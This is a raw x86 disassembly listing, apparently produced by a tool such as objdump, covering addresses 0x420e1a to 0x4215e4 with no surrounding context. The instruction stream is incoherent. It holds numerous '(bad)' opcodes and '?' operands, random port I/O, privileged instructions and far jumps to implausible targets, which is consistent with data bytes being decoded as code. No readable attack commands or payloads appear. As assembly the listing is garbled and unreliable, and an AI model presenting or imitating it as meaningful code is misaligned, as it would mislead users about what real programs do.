  420e1a:	or     DWORD PTR [edx-0x270309d5],ebp
  420e20:	pop    eax
  420e21:	mov    esi,0xef77f4c9
  420e26:	out    dx,al
  420e27:	jbe    0x420e1d
  420e29:	fild   QWORD PTR [edi]
  420e2b:	fisubr WORD PTR [edx]
  420e2d:	inc    eax
  420e2e:	push   0x12b7ca59
  420e33:	enter  0x444,0xe6
  420e37:	ret    0x4ec9
  420e3a:	faddp  st(3),st
  420e3c:	dec    edi
  420e3d:	cmp    DWORD PTR [ecx],edx
  420e3f:	cmp    ch,bl
  420e41:	inc    ebx
  420e42:	popa   
  420e43:	imul   DWORD PTR [ecx-0x7690157]
  420e49:	fnstenv [edx+eax*8-0x11]
  420e4d:	ret    
  420e4e:	ret    
  420e4f:	xchg   ecx,eax
  420e50:	frstor [edi+0x4b]
  420e53:	dec    edx
  420e54:	mov    dh,0x1b
  420e56:	mov    bl,0xfa
  420e58:	fwait
  420e59:	jecxz  0x420e77
  420e5b:	xor    eax,0x1cfbd19c
  420e60:	imul   BYTE PTR [ebx-0x21]
  420e63:	and    DWORD PTR [esp+edi*4],ebx
  420e66:	mov    eax,DWORD PTR [ebx]
  420e68:	les    eax,FWORD PTR [edx+edi*8-0x20]
  420e6c:	jmp    0x3a54:0x4e019def
  420e73:	sub    ch,ch
  420e75:	mov    al,0x16
  420e77:	dec    edi
  420e78:	shl    BYTE PTR [esi+0x71],cl
  420e7b:	jne    0x420e90
  420e7d:	mov    es,WORD PTR [eax+0x723c5fa8]
  420e83:	or     DWORD PTR ds:0x332c7d7,edx
  420e89:	ret    0x5bf8
  420e8c:	xlat   BYTE PTR ds:[ebx]
  420e8d:	xchg   DWORD PTR [ebx-0xf],ebx
  420e90:	or     al,0x9b
  420e92:	jno    0x420e3e
  420e94:	mov    bl,0xf
  420e96:	mov    esi,0x707cece7
  420e9b:	or     ebp,ebx
  420e9d:	xchg   edi,eax
  420e9e:	gs pop es
  420ea0:	inc    edx
  420ea1:	or     ecx,ecx
  420ea3:	and    bh,dh
  420ea5:	in     al,dx
  420ea6:	fisttp WORD PTR [eax]
  420ea8:	xchg   esp,eax
  420ea9:	or     dh,ch
  420eab:	shr    DWORD PTR [edx+0x5f79d3],0xdf
  420eb2:	mov    eax,0x8caa0a47
  420eb7:	out    dx,al
  420eb8:	xchg   eax,ecx
  420eba:	out    dx,eax
  420ebb:	ja     0x420efd
  420ebd:	xor    eax,0x38b82f4b
  420ec2:	out    0x4b,al
  420ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ec5:	xchg   BYTE PTR [esi],al
  420ec7:	mov    WORD PTR [ecx+0x4ab425aa],fs
  420ecd:	and    al,0x6c
  420ecf:	add    al,0x9f
  420ed1:	sub    bh,BYTE PTR [edi+0x70]
  420ed4:	ss dec eax
  420ed6:	test   bh,ah
  420ed8:	jle    0x420edc
  420eda:	sub    esp,DWORD PTR [edx+0x7cb54bb6]
  420ee0:	lods   eax,DWORD PTR ds:[esi]
  420ee1:	mov    ecx,0x949105e3
  420ee6:	loopne 0x420f1c
  420ee8:	dec    ecx
  420ee9:	ds pop es
  420eeb:	popa   
  420eec:	shl    DWORD PTR [eax+0x7d],1
  420eef:	push   edi
  420ef0:	xlat   BYTE PTR ds:[ebx]
  420ef1:	jne    0x420eeb
  420ef3:	xor    ebp,DWORD PTR [esi-0x2f]
  420ef6:	ins    DWORD PTR es:[edi],dx
  420ef7:	out    dx,eax
  420ef8:	ins    DWORD PTR es:[edi],dx
  420ef9:	inc    BYTE PTR [esi+0x20]
  420efc:	push   0xffffffd8
  420efe:	test   esp,ecx
  420f00:	jno    0x420ea5
  420f02:	aad    0x18
  420f04:	mov    ?,WORD PTR ds:0x88f49e7
  420f0a:	mov    BYTE PTR ds:0xb06587ab,dh
  420f10:	ret    0xaa53
  420f13:	jne    0x420f86
  420f15:	jbe    0x420e9f
  420f17:	push   esi
  420f18:	leave  
  420f19:	ja     0x420efb
  420f1b:	rcl    DWORD PTR [esi],0x26
  420f1e:	lods   al,BYTE PTR ds:[esi]
  420f1f:	sti    
  420f20:	jae    0x420ece
  420f22:	jnp    0x420ed7
  420f24:	mov    al,0x6b
  420f26:	mov    bl,0xd2
  420f28:	push   0x3a
  420f2a:	in     eax,dx
  420f2b:	or     al,0xbe
  420f2d:	lock inc edx
  420f2f:	(bad)  
  420f30:	jg     0x420f5c
  420f32:	jo     0x420ef7
  420f34:	adc    BYTE PTR [edx+0x61],bl
  420f37:	mov    es,ebp
  420f39:	in     eax,0x9a
  420f3b:	aas    
  420f3c:	jp     0x420f9c
  420f3e:	push   es
  420f3f:	cld    
  420f40:	cmp    eax,0x8d534a00
  420f45:	imul   ebx,DWORD PTR [edi],0x56e3a428
  420f4b:	stos   DWORD PTR es:[edi],eax
  420f4c:	retf   0x9351
  420f4f:	xchg   edx,eax
  420f50:	cmp    ebx,DWORD PTR [eax]
  420f52:	ja     0x420f9b
  420f54:	pop    edx
  420f55:	xlat   BYTE PTR ds:[ebx]
  420f56:	adc    edi,edi
  420f58:	inc    esp
  420f59:	cmp    dl,BYTE PTR [ebp+0x25]
  420f5c:	outs   dx,DWORD PTR ds:[esi]
  420f5d:	test   DWORD PTR fs:[ecx],ebx
  420f60:	mov    ebx,0x4d2bd3d8
  420f65:	mov    eax,ds:0xc4439a20
  420f6a:	push   ss
  420f6b:	repz mov bl,0xcc
  420f6e:	push   0x1c
  420f70:	cmp    al,0x40
  420f72:	adc    al,0x96
  420f74:	popa   
  420f75:	and    edi,DWORD PTR [edx-0x430c363a]
  420f7b:	mov    WORD PTR [ebx-0x4e],fs
  420f7e:	push   ecx
  420f7f:	lahf   
  420f80:	pop    ebp
  420f81:	ror    ecx,1
  420f83:	out    0xa5,al
  420f85:	test   DWORD PTR [ecx-0x73],0xc209ddda
  420f8c:	jno    0x420f29
  420f8e:	mov    dh,0x9b
  420f90:	pop    ecx
  420f91:	int    0x7e
  420f93:	std    
  420f94:	adc    DWORD PTR [edi-0x51],ecx
  420f97:	enter  0x733,0x41
  420f9b:	sbb    al,0xad
  420f9d:	scas   eax,DWORD PTR es:[edi]
  420f9e:	and    al,0x5d
  420fa0:	xchg   esp,eax
  420fa1:	and    DWORD PTR fs:[ecx-0x6b2e316],eax
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	out    0x79,al
  420fab:	out    dx,al
  420fac:	fsub   DWORD PTR [ebx-0x17f4b35]
  420fb2:	mov    ch,bh
  420fb4:	push   edx
  420fb5:	jmp    0xacd1c8a9
  420fba:	jg     0x420fce
  420fbc:	mov    dh,0xb6
  420fbe:	lock lods al,BYTE PTR ds:[esi]
  420fc0:	pop    edx
  420fc1:	pop    ebp
  420fc2:	push   esi
  420fc3:	std    
  420fc4:	cdq    
  420fc5:	jmp    0x420f7c
  420fc7:	lods   al,BYTE PTR ds:[esi]
  420fc8:	jmp    0x4879bcc8
  420fcd:	ins    BYTE PTR es:[edi],dx
  420fce:	inc    ebp
  420fcf:	cmp    dl,BYTE PTR [eax-0x36]
  420fd2:	test   DWORD PTR [esi+0x1e],edi
  420fd5:	inc    esp
  420fd6:	push   ss
  420fd7:	sbb    eax,eax
  420fd9:	sbb    cl,0xcb
  420fdc:	mov    al,ds:0x9237d679
  420fe1:	push   ecx
  420fe2:	std    
  420fe3:	push   esp
  420fe4:	les    eax,FWORD PTR [esi+0x13]
  420fe7:	jb     0x420fd9
  420fe9:	adc    al,0x6
  420feb:	aaa    
  420fec:	jbe    0x420fcf
  420fee:	jl     0x420fc3
  420ff0:	fdivr  st(0),st
  420ff2:	xlat   BYTE PTR ds:[ebx]
  420ff3:	cld    
  420ff4:	outs   dx,BYTE PTR ds:[esi]
  420ff5:	ret    0x6209
  420ff8:	fsub   DWORD PTR [edi]
  420ffa:	mov    DWORD PTR [esi],edx
  420ffc:	pop    ss
  420ffd:	cmp    al,0x93
  420fff:	mov    al,0x3
  421001:	(bad)  
  421002:	idiv   ah
  421004:	pop    ds
  421005:	jp     0x420fa7
  421007:	(bad)  
  421008:	or     DWORD PTR [esi+0x1],ebx
  42100b:	je     0x420fc0
  42100d:	sbb    BYTE PTR [edi+0x2b509922],bh
  421013:	pop    ds
  421014:	in     eax,0x8e
  421016:	mov    cl,0x9b
  421018:	daa    
  421019:	cdq    
  42101a:	popa   
  42101b:	mov    eax,ds:0x7c72732d
  421020:	pop    esp
  421021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421022:	das    
  421023:	mov    edx,0xd873501b
  421028:	xchg   edi,eax
  421029:	enter  0xea6d,0x19
  42102d:	je     0x421092
  42102f:	mov    bh,0xa0
  421031:	cmp    BYTE PTR [ebx],0xf3
  421034:	mov    WORD PTR [eax],es
  421036:	and    BYTE PTR [ecx],0xa1
  421039:	imul   esi,DWORD PTR [edi+0x66c34991],0xbf18f2d
  421043:	cmc    
  421044:	aaa    
  421045:	fist   DWORD PTR [edx+0x77]
  421048:	jo     0x420fe6
  42104a:	mov    dh,ah
  42104c:	mov    ebp,edx
  42104e:	jmp    0x23fd97a4
  421053:	mov    DWORD PTR [ecx+0x38ef5cea],ebp
  421059:	and    al,0xf7
  42105b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42105d:	pop    esi
  42105e:	pop    ss
  42105f:	xor    DWORD PTR [ebp-0x1b],edx
  421062:	fwait
  421063:	and    bl,cl
  421065:	xchg   ebp,eax
  421066:	ror    bl,cl
  421068:	lock pop eax
  42106a:	imul   edx,DWORD PTR [edi-0x34],0x11fced52
  421071:	repnz fidiv WORD PTR [eax-0x36]
  421075:	add    BYTE PTR [ebx],ch
  421077:	xchg   ebp,eax
  421078:	je     0x421097
  42107a:	jno    0x421070
  42107c:	loop   0x4210f0
  42107e:	mov    ebp,0x28001713
  421083:	hlt    
  421084:	sub    BYTE PTR [edx],bl
  421086:	xchg   ebx,eax
  421087:	aas    
  421088:	repz out dx,eax
  42108a:	ss stc 
  42108c:	sar    DWORD PTR [eax+0x4875eb60],0x57
  421093:	sti    
  421094:	and    DWORD PTR [eax-0x6d8baaf6],edi
  42109a:	push   ebp
  42109b:	xor    DWORD PTR [ecx],0x7d703b38
  4210a1:	and    eax,0x32f506c3
  4210a6:	and    cl,BYTE PTR [ebx+eiz*2]
  4210a9:	retf   0x5e2f
  4210ac:	shl    BYTE PTR ds:0xa53d3ef3,0x46
  4210b3:	add    dl,bh
  4210b5:	enter  0x72ed,0x43
  4210b9:	mov    ecx,0xadadaea4
  4210be:	mov    ds:0x5adfcf2d,al
  4210c3:	fmul   DWORD PTR [edi]
  4210c5:	mov    eax,0xa0e82b71
  4210ca:	rcr    BYTE PTR ss:[ecx],cl
  4210cd:	aam    0xba
  4210cf:	aaa    
  4210d0:	ja     0x421092
  4210d2:	cmp    eax,0xa841519b
  4210d7:	inc    ebp
  4210d8:	out    0xd7,eax
  4210da:	or     eax,0x2fc6da7c
  4210df:	cwde   
  4210e0:	sbb    al,0x60
  4210e2:	cmp    ecx,DWORD PTR [edi]
  4210e4:	jg     0x4210aa
  4210e6:	(bad)  
  4210e7:	stc    
  4210e8:	les    esi,FWORD PTR [edx]
  4210ea:	xlat   BYTE PTR ds:[ebx]
  4210eb:	inc    eax
  4210ec:	pop    esi
  4210ed:	retf   0xe90e
  4210f0:	es dec ecx
  4210f2:	mov    al,ds:0xc60189b5
  4210f7:	cdq    
  4210f8:	xchg   ecx,eax
  4210f9:	mov    ds:0x1d12c167,al
  4210fe:	mov    ah,0xfe
  421100:	adc    al,0xe8
  421102:	mov    ah,0xfe
  421104:	(bad)  
  421105:	adc    DWORD PTR [edx+0x7060efd5],ebp
  42110b:	cdq    
  42110c:	repz xor bl,BYTE PTR [esp]
  421110:	sbb    BYTE PTR [edi-0x64aad3d],bh
  421116:	lahf   
  421117:	fwait
  421118:	xor    BYTE PTR [ebx+0xe417f5f],al
  42111e:	(bad)  
  42111f:	test   eax,0x72535fdf
  421124:	int3   
  421125:	sti    
  421126:	pop    edx
  421127:	xor    eax,0x69242aca
  42112c:	arpl   WORD PTR [ecx+0x2a78eb5d],cx
  421132:	test   DWORD PTR [esi-0x456863f2],ebp
  421138:	dec    ecx
  421139:	cld    
  42113a:	sbb    DWORD PTR [ebp-0x18],eax
  42113d:	pushf  
  42113e:	mov    ah,0x27
  421140:	cmp    al,0xf9
  421142:	inc    eax
  421143:	sub    al,0x4d
  421145:	dec    esp
  421146:	or     al,0xeb
  421148:	dec    eax
  421149:	mov    eax,0xfc434380
  42114e:	stc    
  42114f:	xchg   esp,eax
  421150:	sub    DWORD PTR [ecx-0x4f70df41],ebx
  421156:	push   ecx
  421157:	sub    dh,BYTE PTR [ecx-0x64]
  42115a:	mov    ds:0x6ffb75a0,al
  42115f:	retf   
  421160:	sub    ecx,esp
  421162:	mov    ebx,DWORD PTR [esi]
  421164:	rcr    BYTE PTR [esi],1
  421166:	in     eax,dx
  421167:	frstor [esp+eiz*4]
  42116a:	or     esi,ecx
  42116c:	push   0x3a62c0e8
  421171:	sbb    DWORD PTR [edx+0x1076b52f],0xf814004
  42117b:	sub    eax,0x51e62f83
  421180:	jmp    0x4211a9
  421182:	loop   0x421175
  421184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421185:	push   ss
  421186:	cwde   
  421187:	pop    esi
  421188:	adc    ebx,DWORD PTR [ebx+esi*1+0x36f3441f]
  42118f:	cmp    BYTE PTR [ecx],dl
  421191:	and    edx,DWORD PTR [edi+0x29368037]
  421197:	out    0xd6,eax
  421199:	push   eax
  42119a:	add    al,0xd2
  42119c:	cmc    
  42119d:	fsubr  DWORD PTR [esi+0x6a574853]
  4211a3:	dec    eax
  4211a4:	push   eax
  4211a5:	popf   
  4211a6:	out    dx,eax
  4211a7:	fwait
  4211a8:	or     bh,BYTE PTR [ebx-0x5e1a5168]
  4211ae:	retf   
  4211af:	scas   eax,DWORD PTR es:[edi]
  4211b0:	scas   al,BYTE PTR es:[edi]
  4211b1:	lods   al,BYTE PTR ds:[esi]
  4211b2:	in     al,0x49
  4211b4:	adc    al,BYTE PTR [ebx+0x3e]
  4211b7:	loop   0x421139
  4211b9:	mov    ch,0xbc
  4211bb:	mov    ebp,0xf040f11
  4211c0:	mov    al,ds:0x37faeb1f
  4211c5:	fbld   TBYTE PTR [eax+0x2e8284ff]
  4211cb:	lods   al,BYTE PTR ds:[esi]
  4211cc:	fstp   st(4)
  4211ce:	add    DWORD PTR [eax-0x7838f9ba],esi
  4211d4:	jmp    0x3b6d:0xed636adc
  4211db:	arpl   WORD PTR [edi],dx
  4211dd:	sti    
  4211de:	test   DWORD PTR [eax+0x6ffa093f],ebp
  4211e4:	arpl   WORD PTR [edx+0x531004a7],sp
  4211ea:	pop    ebx
  4211eb:	jmp    0xe9fb:0x3ff2c128
  4211f2:	jmp    0xbe5fdf10
  4211f7:	pop    ss
  4211f8:	add    al,BYTE PTR [edx]
  4211fa:	push   esi
  4211fb:	jp     0x421219
  4211fd:	fstp   DWORD PTR [ebx-0x475194ce]
  421203:	int3   
  421204:	push   ss
  421205:	out    0x5b,al
  421207:	or     ebx,edx
  421209:	imul   eax,esi,0x24
  42120c:	inc    eax
  42120d:	mov    ds:0xd87973cc,al
  421212:	push   ecx
  421213:	in     eax,dx
  421214:	dec    edx
  421215:	or     al,0xd3
  421217:	push   eax
  421218:	ret    
  421219:	push   edi
  42121a:	xor    DWORD PTR [ebx],edi
  42121c:	fst    QWORD PTR [ebp+0x2d]
  42121f:	jo     0x4211aa
  421221:	idiv   dl
  421223:	cmp    al,0x4f
  421225:	mov    ?,WORD PTR [eax+0x2f]
  421228:	push   ebx
  421229:	inc    ebx
  42122a:	mov    cl,0xc7
  42122c:	jae    0x4211d2
  42122e:	dec    ecx
  42122f:	jb     0x4211ce
  421231:	adc    al,0xc
  421233:	fisubr WORD PTR [edx]
  421235:	int3   
  421236:	test   al,0x89
  421238:	mov    dh,BYTE PTR ds:0xa905641e
  42123e:	mov    bh,0xe0
  421240:	icebp  
  421241:	fsub   QWORD PTR [edx]
  421243:	jg     0x4212ad
  421245:	xlat   BYTE PTR ds:[ebx]
  421246:	sbb    edi,DWORD PTR [ecx]
  421248:	mov    esi,0xa855919c
  42124d:	add    bl,al
  42124f:	sub    BYTE PTR [edx+edx*8-0x52dc3213],dh
  421256:	mov    ebx,0x465da0ab
  42125b:	cmp    al,0x48
  42125d:	push   ecx
  42125e:	fwait
  42125f:	shr    DWORD PTR [edi-0xfa769a4],1
  421265:	test   eax,0x9a5fdb59
  42126a:	mov    eax,0x263e7cfb
  42126f:	mov    esi,esp
  421271:	inc    esp
  421272:	ss (bad) 
  421274:	xor    BYTE PTR [ebx-0x3c75a207],cl
  42127a:	and    BYTE PTR ds:0xba298888,cl
  421280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421281:	inc    edx
  421282:	inc    ebx
  421283:	js     0x42126f
  421285:	inc    ebp
  421286:	add    al,0x30
  421288:	lds    eax,FWORD PTR [eax]
  42128a:	fild   WORD PTR [ebx+edx*4]
  42128d:	inc    ecx
  42128e:	xchg   ebp,eax
  42128f:	js     0x421213
  421291:	jb     0x421214
  421293:	cmp    ch,BYTE PTR [eax-0x5224ed6e]
  421299:	icebp  
  42129a:	fwait
  42129b:	xor    esp,0xc37e670d
  4212a1:	push   0x76
  4212a3:	mov    ah,0x72
  4212a5:	fdiv   st(0),st
  4212a7:	xor    cl,BYTE PTR [edx]
  4212a9:	adc    DWORD PTR ds:0x730b7d62,edx
  4212af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212b0:	push   edi
  4212b1:	pop    eax
  4212b2:	dec    edi
  4212b3:	aaa    
  4212b4:	ja     0x421252
  4212b6:	sub    DWORD PTR [ebx-0x7f38d30c],0x44b2b42a
  4212c0:	dec    esp
  4212c1:	repz jge 0x4212f3
  4212c4:	or     ebp,ebx
  4212c6:	xchg   edi,eax
  4212c7:	fnsave [ebp+0x73fb944f]
  4212cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212cf:	ins    DWORD PTR es:[edi],dx
  4212d0:	popa   
  4212d1:	adc    ecx,DWORD PTR [ebp+0x200e80a]
  4212d7:	cmc    
  4212d8:	adc    al,0x9e
  4212da:	pop    esi
  4212db:	ja     0x4212b0
  4212dd:	ror    eax,0x1b
  4212e0:	repnz ss dec esi
  4212e3:	add    eax,0xc3eb1115
  4212e8:	dec    edx
  4212e9:	loope  0x42128b
  4212eb:	jo     0x4212a4
  4212ed:	popf   
  4212ee:	int3   
  4212ef:	mov    al,ds:0x1226a073
  4212f4:	jo     0x421301
  4212f6:	in     eax,dx
  4212f7:	mov    eax,0x530fa7af
  4212fc:	leave  
  4212fd:	mov    ecx,?
  4212ff:	iret   
  421300:	pop    es
  421301:	mov    cl,0x41
  421303:	push   esi
  421304:	or     dl,0x17
  421307:	xor    DWORD PTR ss:[eax-0x2c],ebx
  42130b:	pop    ecx
  42130c:	rcr    BYTE PTR [edx],1
  42130e:	jle    0x421373
  421310:	scas   eax,DWORD PTR es:[edi]
  421311:	sti    
  421312:	call   0xf5b0:0xfd9b7540
  421319:	ret    
  42131a:	iret   
  42131b:	jne    0x421351
  42131d:	out    dx,al
  42131e:	mov    ebx,0x5e9ce2b0
  421323:	cmc    
  421324:	ins    DWORD PTR es:[edi],dx
  421325:	cs js  0x4212f3
  421328:	mov    bl,0x99
  42132a:	lea    ecx,[edx-0x4]
  42132d:	and    eax,0xf7f3b3c0
  421332:	pop    eax
  421333:	js     0x4212b5
  421335:	xor    ebp,DWORD PTR [ecx-0x12e53135]
  42133b:	push   edx
  42133c:	dec    esp
  42133d:	mov    eax,0xd64d509f
  421342:	or     dl,bh
  421344:	(bad)  
  421345:	ja     0x4213a2
  421347:	xlat   BYTE PTR ds:[ebx]
  421348:	and    eax,0xc593c51c
  42134d:	mov    bl,0x3d
  42134f:	add    eax,0x2531bae8
  421354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421355:	stos   DWORD PTR es:[edi],eax
  421356:	pop    ebp
  421357:	xchg   edi,eax
  421358:	xor    al,0x32
  42135a:	sbb    ecx,DWORD PTR [eax+0x4e847db0]
  421360:	sub    ecx,DWORD PTR [esi-0xd]
  421363:	adc    ebp,edx
  421365:	pushf  
  421366:	or     ch,al
  421368:	pop    eax
  421369:	push   ecx
  42136a:	aam    0x5b
  42136c:	jmp    0xbc88ef07
  421371:	js     0x421371
  421373:	xchg   esi,eax
  421374:	inc    ebp
  421375:	iret   
  421376:	mov    bh,0x10
  421378:	xchg   esi,eax
  421379:	mov    BYTE PTR [edi],bh
  42137b:	stos   DWORD PTR es:[edi],eax
  42137c:	xor    dl,BYTE PTR [edi+ecx*2]
  42137f:	nop
  421380:	mov    al,cl
  421382:	or     al,0xd7
  421384:	inc    esi
  421385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421386:	xor    DWORD PTR [ebp-0x44],ebx
  421389:	adc    al,0x7a
  42138b:	add    DWORD PTR ss:[eax+0xa],edx
  42138f:	pop    ss
  421390:	sbb    edi,DWORD PTR [edi+eiz*8+0x698dd32b]
  421397:	and    BYTE PTR ds:0xa210f9ea,al
  42139d:	(bad)
  4213a0:	xor    DWORD PTR [ebx+0x6f8ec97f],0x141867f2
  4213aa:	jnp    0x4213d3
  4213ac:	ins    BYTE PTR es:[edi],dx
  4213ad:	dec    eax
  4213ae:	ins    DWORD PTR es:[edi],dx
  4213af:	push   esp
  4213b0:	shr    BYTE PTR ds:0xd3c44185,cl
  4213b6:	fist   DWORD PTR [edi-0x71]
  4213b9:	cmp    BYTE PTR ds:[ebp-0x2644dd41],dh
  4213c0:	mov    eax,ds:0xf75a555a
  4213c5:	sbb    eax,eax
  4213c7:	clc    
  4213c8:	adc    ecx,edx
  4213ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213cb:	pop    ebx
  4213cc:	cld    
  4213cd:	inc    ebx
  4213ce:	loop   0x4213fe
  4213d0:	add    eax,0xd2909d49
  4213d5:	dec    esi
  4213d6:	ss es mov ebx,esi
  4213da:	jbe    0x4213c6
  4213dc:	jl     0x4213ca
  4213de:	mov    edi,0xdd9793f7
  4213e3:	mov    ebp,0x746dd01
  4213e8:	jne    0x4213a5
  4213ea:	dec    ebp
  4213eb:	popf   
  4213ec:	inc    ebp
  4213ed:	(bad)  [eax+0x65d5cd7e]
  4213f3:	add    al,ah
  4213f5:	dec    DWORD PTR [ecx-0x52]
  4213f8:	mov    bh,0x47
  4213fa:	adc    DWORD PTR ds:0xe7d89ff3,ecx
  421400:	out    dx,eax
  421401:	faddp  st(2),st
  421403:	xchg   esi,eax
  421404:	mov    esi,0x8b22cfa8
  421409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42140a:	jmp    0x47e6:0xc0ab731d
  421411:	push   ebp
  421412:	pop    edi
  421413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421414:	lods   eax,DWORD PTR ds:[esi]
  421415:	ret    0x82b1
  421418:	cmp    DWORD PTR [ecx-0x59816e9a],ecx
  42141e:	and    eax,0x2ac26565
  421423:	xchg   edi,eax
  421424:	not    DWORD PTR [ebp+0x11]
  421427:	int3   
  421428:	add    al,0x52
  42142a:	ret    
  42142b:	push   es
  42142c:	lods   al,BYTE PTR ds:[esi]
  42142d:	adc    edx,DWORD PTR [edx+0x14de5332]
  421433:	mov    ecx,0x90a096a8
  421438:	pushf  
  421439:	add    al,0x6a
  42143b:	addr16 xor eax,0x50b34470
  421441:	(bad)  
  421442:	xor    BYTE PTR [ebp-0x57],dh
  421445:	shr    DWORD PTR [eax+0x69],1
  421448:	fstp   DWORD PTR [esi+0x27]
  42144b:	pop    ebp
  42144c:	addr16 and al,0xae
  42144f:	(bad)  
  421450:	cmp    ebp,DWORD PTR [ebx]
  421452:	jne    0x421408
  421454:	inc    esp
  421455:	hlt    
  421456:	xchg   DWORD PTR [edx-0x42],ebx
  421459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42145a:	popf   
  42145b:	pop    edi
  42145c:	push   ds
  42145d:	pop    ss
  42145e:	dec    esi
  42145f:	rcr    ch,0x8f
  421462:	jg     0x4214a9
  421464:	ret    
  421465:	or     dh,0x20
  421468:	data16 stos BYTE PTR es:[edi],al
  42146a:	stos   BYTE PTR es:[edi],al
  42146b:	xor    al,0xbb
  42146d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42146e:	xchg   DWORD PTR [eax+0x58],esp
  421471:	ins    BYTE PTR es:[edi],dx
  421472:	ds std 
  421474:	sub    dl,bl
  421476:	popf   
  421477:	or     DWORD PTR [ecx+ecx*1],esp
  42147a:	outs   dx,DWORD PTR ds:[esi]
  42147b:	test   eax,0xf580751b
  421480:	daa    
  421481:	and    eax,0xa5c0aaad
  421486:	js     0x4214b5
  421488:	in     al,0x12
  42148a:	pop    esp
  42148b:	add    al,0xff
  42148d:	fidiv  WORD PTR [edx-0x2eeada9a]
  421493:	dec    ebx
  421494:	mov    ecx,0xc426388a
  421499:	jl     0x421463
  42149b:	cmp    eax,0xededae7f
  4214a0:	xor    ah,BYTE PTR ds:0x3d9dc36f
  4214a6:	sub    ah,BYTE PTR cs:[ebx]
  4214a9:	add    eax,0x63f62c89
  4214ae:	sbb    dl,BYTE PTR [ebp+0x6c]
  4214b1:	xor    bl,BYTE PTR [esi+edx*8-0x1b56d431]
  4214b8:	cld    
  4214b9:	and    BYTE PTR [ebp+0x2d],dl
  4214bc:	xchg   edi,eax
  4214bd:	cs xchg ebx,eax
  4214bf:	mov    ss,WORD PTR [ebx-0x15]
  4214c2:	lock jae 0x4214ff
  4214c5:	fidiv  WORD PTR [ebx+0x7c3f01e7]
  4214cb:	add    ecx,DWORD PTR [ebx]
  4214cd:	mov    ds:0xcb6c9d70,eax
  4214d2:	pop    ds
  4214d3:	test   DWORD PTR [edx-0x66],edx
  4214d6:	sti    
  4214d7:	push   ds
  4214d8:	bound  edi,QWORD PTR [eax-0x4f]
  4214db:	jle    0x4214a8
  4214dd:	inc    ebx
  4214de:	mov    eax,0x3a3d3e53
  4214e3:	jmp    0xdb0193ed
  4214e8:	cs sub bh,0x73
  4214ec:	pop    ebp
  4214ed:	repz pop ebx
  4214ef:	sub    esp,DWORD PTR [eax-0x36a85b24]
  4214f5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4214f7:	mov    BYTE PTR [edx-0x33],al
  4214fa:	hlt    
  4214fb:	ds cmp al,0x22
  4214fe:	sbb    edx,DWORD PTR [ebp*8-0x53b584f6]
  421505:	cmp    edx,ebp
  421507:	push   ss
  421508:	or     al,0x94
  42150a:	xchg   edi,eax
  42150b:	daa    
  42150c:	mov    eax,0x10fc6e6d
  421511:	cmp    bl,BYTE PTR [eax+0x28]
  421514:	push   0xc
  421516:	sub    BYTE PTR [ecx-0x4b7913ee],bh
  42151c:	stos   DWORD PTR es:[edi],eax
  42151d:	inc    ebx
  42151e:	adc    eax,DWORD PTR [edx]
  421520:	imul   ah
  421522:	(bad)
  421525:	and    edx,edi
  421527:	add    dl,BYTE PTR [ebp-0x7247e01a]
  42152d:	add    al,bl
  42152f:	call   0xe95177a5
  421534:	push   0xd180813e
  421539:	mov    ebp,0x1c50b7eb
  42153e:	rcl    esp,1
  421540:	xchg   ecx,eax
  421541:	add    eax,0x49104bea
  421546:	add    edi,DWORD PTR [esi-0x68]
  421549:	pop    eax
  42154a:	mov    esp,0x67463d21
  42154f:	sbb    BYTE PTR [esi+esi*8+0xa],al
  421553:	inc    ebp
  421554:	leave  
  421555:	xor    DWORD PTR [edx-0x75],edx
  421558:	outs   dx,BYTE PTR ds:[esi]
  421559:	(bad)  
  42155a:	mov    dl,0x1e
  42155c:	mov    ds:0x9f12503f,al
  421561:	push   cs
  421562:	mov    bh,0xd1
  421564:	fucomi st,st(2)
  421566:	mov    ebp,0x339b4dec
  42156b:	pop    ebx
  42156c:	mov    ch,0xb1
  42156e:	outs   dx,BYTE PTR ds:[esi]
  42156f:	sbb    eax,DWORD PTR [esi]
  421571:	pop    ecx
  421572:	jbe    0x4215db
  421574:	cmp    al,0x4e
  421576:	xor    eax,0x55df0ff0
  42157b:	je     0x421571
  42157d:	inc    BYTE PTR [eax+ebx*1-0x631ffd8f]
  421584:	ss add eax,esp
  421587:	in     al,0x42
  421589:	les    edx,FWORD PTR [ebx+0x2b]
  42158c:	mov    DWORD PTR ds:0x14bc0d95,0x24f5474
  421596:	(bad)  
  421597:	lock sbb edi,DWORD PTR [ebx-0x7a]
  42159b:	(bad)  
  42159c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42159d:	sbb    BYTE PTR [ebx+ecx*1-0x21dd3ac9],bh
  4215a4:	imul   ecx,ebx,0x25
  4215a7:	mov    ebx,0x985c73ad
  4215ac:	mov    al,ds:0xe41bba0e
  4215b1:	mov    edx,0x4b231919
  4215b6:	fcmovnu st,st(4)
  4215b8:	movsx  ebp,al
  4215bb:	mov    bl,0xb7
  4215bd:	in     al,0x42
  4215bf:	jl     0x42154a
  4215c1:	push   ds
  4215c2:	mov    ebx,0xba4cd27a
  4215c7:	fsubp  st(0),st
  4215c9:	push   ebx
  4215ca:	cmp    dh,BYTE PTR [esi]
  4215cc:	mov    ecx,esp
  4215ce:	rcr    DWORD PTR [ebx],cl
  4215d0:	or     BYTE PTR [eax],0x8f
  4215d3:	lea    ebp,[esi-0x2f]
  4215d6:	rcr    BYTE PTR [edi],cl
  4215d8:	sub    DWORD PTR [ebp+0x3bcc0f9],0x4e5bd886
  4215e2:	iret   
  4215e3:	inc    ecx
  4215e4:	retf   
